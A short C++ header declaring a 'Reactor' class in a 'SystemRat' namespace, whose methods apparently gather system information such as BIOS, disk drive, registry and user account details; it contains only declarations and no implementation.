#pragma once
#ifndef SYSTEMRAT_MAIN_REACTOR_H
#define SYSTEMRAT_MAIN_REACTOR_H

#include "../DataManager/DataManager.h"
#include "../Common/Common.h"

namespace SystemRat
{
	namespace Main
	{
		class Reactor final
		{
		public:
			explicit Reactor() = default;
			~Reactor() = default;

			void init();
			std::string react(Action action);

		private:
			std::string baseboard();
			std::string bios();
			std::string coputerSystem();
			std::string desktopMonitor();
			std::string diskDrive();
			std::string keyboard();
			std::string networkClient();
			std::string operatingSystem();
			std::string pointingDevice();
			std::string processor();
			std::string registry();
			std::string soundDevice();
			std::string usbController();
			std::string userAccount();
		private:
			SystemRat::DataManager::DataManager m_dataManager;
		};
	}
}
#endif